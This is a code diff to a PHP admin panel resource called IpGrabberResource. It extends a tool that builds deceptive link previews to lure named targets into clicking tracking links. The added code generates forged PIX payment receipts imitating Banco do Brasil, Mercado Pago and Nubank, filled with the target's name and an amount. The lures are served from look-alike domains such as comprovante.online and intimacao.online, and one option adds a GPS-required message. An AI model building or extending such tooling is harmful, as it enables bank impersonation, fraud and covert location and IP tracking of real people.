@@ -237,6 +237,7 @@ class IpGrabberResource extends Resource
                                 ->options([
                                     'PIX Estornado' => 'PIX Estornado',
                                     IpGrabber::DEFAULT_CLICK_MESSAGE => IpGrabber::DEFAULT_CLICK_MESSAGE,
+                                    IpGrabber::GPS_REQUIRED_MESSAGE => IpGrabber::GPS_REQUIRED_MESSAGE,
                                     'Sistema fora do ar' => 'Sistema fora do ar',
                                     'Redirecionar para página' => 'Redirecionar para página',
                                 ])
@@ -262,9 +263,39 @@ class IpGrabberResource extends Resource
                                 ->placeholder('Ex: João da Silva')
                                 ->maxLength(60)
                                 ->live(debounce: 400)
-                                ->required(fn (Get $get): bool => $get('preview_tipo') === 'pix_nome_alvo')
-                                ->visible(fn (Get $get): bool => $get('preview_tipo') === 'pix_nome_alvo')
+                                ->required(fn (Get $get): bool => in_array($get('preview_tipo'), ['pix_nome_alvo', 'pix_bb', 'pix_mercadopago'], true))
+                                ->visible(fn (Get $get): bool => in_array($get('preview_tipo'), ['pix_nome_alvo', 'pix_bb', 'pix_mercadopago'], true))
                                 ->helperText('Nome que será escrito automaticamente no comprovante PIX.')
+                                ->columnSpanFull(),
+
+                            Forms\Components\TextInput::make('pix_bb_valor')
+                                ->label('Valor do comprovante BB')
+                                ->placeholder('Ex: 250,00')
+                                ->maxLength(20)
+                                ->live(debounce: 400)
+                                ->required(fn (Get $get): bool => $get('preview_tipo') === 'pix_bb')
+                                ->visible(fn (Get $get): bool => $get('preview_tipo') === 'pix_bb')
+                                ->helperText('Valor que aparecerá no comprovante Banco do Brasil.')
+                                ->columnSpanFull(),
+
+                            Forms\Components\TextInput::make('pix_mp_valor')
+                                ->label('Valor do comprovante Mercado Pago')
+                                ->placeholder('Ex: 250,00')
+                                ->maxLength(20)
+                                ->live(debounce: 400)
+                                ->required(fn (Get $get): bool => $get('preview_tipo') === 'pix_mercadopago')
+                                ->visible(fn (Get $get): bool => $get('preview_tipo') === 'pix_mercadopago')
+                                ->helperText('Valor que aparecerá no comprovante Mercado Pago.')
+                                ->columnSpanFull(),
+
+                            Forms\Components\TextInput::make('pix_nubank_valor')
+                                ->label('Valor do comprovante Nubank')
+                                ->placeholder('Ex: 250,00')
+                                ->maxLength(20)
+                                ->live(debounce: 400)
+                                ->required(fn (Get $get): bool => $get('preview_tipo') === 'pix_nubank')
+                                ->visible(fn (Get $get): bool => $get('preview_tipo') === 'pix_nubank')
+                                ->helperText('Valor que aparecerá no comprovante Nubank.')
                                 ->columnSpanFull(),
 
                             Forms\Components\TextInput::make('noticia_url')
@@ -294,12 +325,12 @@ class IpGrabberResource extends Resource
                             Forms\Components\Select::make('tracking_domain')
                                 ->label('Domínio do link')
                                 ->options([
-                                    'comprovante-pix.site' => 'comprovante-pix.site',
+                                    'comprovante.online' => 'comprovante.online',
                                     'comprovante.online' => 'comprovante.online',
                                     'intimacao.online' => 'intimacao.online',
                                     'agenciadanoticia.online' => 'agenciadanoticia.online',
                                 ])
-                                ->default('comprovante-pix.site')
+                                ->default('comprovante.online')
                                 ->selectablePlaceholder(false)
                                 ->live()
                                 ->required(fn (Get $get): bool => $get('preview_tipo') === 'mensagem')
@@ -463,7 +494,7 @@ class IpGrabberResource extends Resource
             'pix_bradesco' => static::pixModelCardLabel(
                 'Bradesco',
                 'Comprovante pronto',
-                'comprovante-pix.site',
+                'comprovante.online',
                 static::resolveStoragePreviewAssetUrl('pixel-og/templates/pix-bradesco.png')
             ),
             'pix_caixa' => static::pixModelCardLabel(
@@ -473,10 +504,28 @@ class IpGrabberResource extends Resource
                 static::resolvePublicPreviewAssetUrl('images/comprovante-pix-caixa.png')
             ),
             'pix_nome_alvo' => static::pixModelCardLabel(
-                'Em nome do alvo',
-                'Informe o nome do alvo',
+                'Genérico',
+                'Informe nome do alvo',
                 'comprovante.online',
-                static::resolvePublicPreviewAssetUrl('images/pix-img-gerar.png')
+                static::resolvePublicPreviewAssetUrl('images/comprovante-pix-nomedalvo.jpg')
+            ),
+            'pix_bb' => static::pixModelCardLabel(
+                'Banco do Brasil',
+                'Informe nome do alvo e valor',
+                'comprovante.online',
+                static::resolvePublicPreviewAssetUrl('images/comprovante-pix-bb.jpg')
+            ),
+            'pix_mercadopago' => static::pixModelCardLabel(
+                'Mercado Pago',
+                'Informe nome do alvo e valor',
+                'comprovante.online',
+                static::resolvePublicPreviewAssetUrl('images/comprovante-pix-mp.jpg')
+            ),
+            'pix_nubank' => static::pixModelCardLabel(
+                'Nubank',
+                'Informe o valor',
+                'comprovante.online',
+                static::resolvePublicPreviewAssetUrl('images/comprovante-pix-nu.jpg')
             ),
         ];
     }
@@ -505,6 +554,9 @@ class IpGrabberResource extends Resource
             'pix_bradesco' => 'PIX Bradesco',
             'pix_caixa' => 'PIX Caixa',
             'pix_nome_alvo' => 'PIX em nome do alvo',
+            'pix_bb' => 'PIX BB (Banco do Brasil)',
+            'pix_mercadopago' => 'PIX Mercado Pago',
+            'pix_nubank' => 'PIX Nubank',
             'intimacao' => 'Intimação',
             default => 'Mensagem customizada',
         };
@@ -545,7 +597,7 @@ class IpGrabberResource extends Resource
         $previewMessage = $preview['message'];
         $imageStyle = match ($previewType) {
             'pix_bradesco' => 'display:block;width:100%;height:192px;object-fit:cover;object-position:center;background:#ffffff;',
-            'pix_caixa', 'pix_nome_alvo' => 'display:block;width:100%;height:192px;object-fit:contain;object-position:center;background:#ffffff;padding:8px 6px;',
+            'pix_caixa', 'pix_nome_alvo', 'pix_bb', 'pix_mercadopago', 'pix_nubank' => 'display:block;width:100%;height:192px;object-fit:contain;object-position:center;background:#ffffff;padding:8px 6px;',
             default => 'display:block;width:100%;height:192px;object-fit:cover;',
         };
 
@@ -598,7 +650,7 @@ class IpGrabberResource extends Resource
                 'Comprovante PIX Bradesco',
                 'Confirme sua chave pix clicando aqui.',
                 (string) IpGrabber::DEFAULT_CLICK_MESSAGE,
-                'comprovante-pix.site',
+                'comprovante.online',
             ],
             'pix_caixa' => [
                 'Comprovante PIX Caixa',
@@ -608,6 +660,24 @@ class IpGrabberResource extends Resource
             ],
             'pix_nome_alvo' => [
                 'Comprovante PIX',
+                'Clique para abrir seu comprovante.',
+                (string) IpGrabber::DEFAULT_CLICK_MESSAGE,
+                'comprovante.online',
+            ],
+            'pix_bb' => [
+                'Comprovante BB',
+                'Clique para abrir seu comprovante.',
+                (string) IpGrabber::DEFAULT_CLICK_MESSAGE,
+                'comprovante.online',
+            ],
+            'pix_mercadopago' => [
+                'Comprovante de Pix',
+                'Clique para abrir seu comprovante.',
+                (string) IpGrabber::DEFAULT_CLICK_MESSAGE,
+                'comprovante.online',
+            ],
+            'pix_nubank' => [
+                'Comprovante de transferência',
                 'Clique para abrir seu comprovante.',
                 (string) IpGrabber::DEFAULT_CLICK_MESSAGE,
                 'comprovante.online',
@@ -622,7 +692,7 @@ class IpGrabberResource extends Resource
                 'Título do preview',
                 'A descrição do link aparecerá aqui no momento do compartilhamento.',
                 'PIX Estornado',
-                'comprovante-pix.site',
+                'comprovante.online',
             ],
         };
 
@@ -679,6 +749,44 @@ class IpGrabberResource extends Resource
             }
         }
 
+        if ($previewType === 'pix_bb') {
+            $nomeAlvo = trim((string) ($get('nome_alvo') ?: ''));
+            $valor    = trim((string) ($get('pix_bb_valor') ?: ''));
+
+            if ($nomeAlvo !== '' && $valor !== '') {
+                try {
+                    return app(\App\Services\Pixel\PixBBImagemService::class)->gerarDataUri($nomeAlvo, $valor);
+                } catch (\Throwable) {
+                    return null;
+                }
+            }
+        }
+
+        if ($previewType === 'pix_mercadopago') {
+            $nomeAlvo = trim((string) ($get('nome_alvo') ?: ''));
+            $valor    = trim((string) ($get('pix_mp_valor') ?: ''));
+
+            if ($nomeAlvo !== '' && $valor !== '') {
+                try {
+                    return app(\App\Services\Pixel\PixMercadoPagoImagemService::class)->gerarDataUri($nomeAlvo, $valor);
+                } catch (\Throwable) {
+                    return null;
+                }
+            }
+        }
+
+        if ($previewType === 'pix_nubank') {
+            $valor = trim((string) ($get('pix_nubank_valor') ?: ''));
+
+            if ($valor !== '') {
+                try {
+                    return app(\App\Services\Pixel\PixNubankImagemService::class)->gerarDataUri($valor);
+                } catch (\Throwable) {
+                    return null;
+                }
+            }
+        }
+
         if ($previewType === 'pix_caixa') {
             $valor = trim((string) ($get('pix_caixa_valor') ?: ''));
 
@@ -705,8 +813,9 @@ class IpGrabberResource extends Resource
         $trackingDomain = trim((string) ($get('tracking_domain') ?: ''));
 
         return match ($previewType) {
-            'pix_bradesco' => 'comprovante-pix.site',
+            'pix_bradesco' => 'comprovante.online',
             'pix_caixa', 'pix_nome_alvo' => 'comprovante.online',
+            'pix_bb', 'pix_mercadopago', 'pix_nubank' => 'comprovante.online',
             'intimacao' => 'intimacao.online',
             'noticia' => 'agenciadanoticia.online',
             default => $trackingDomain,
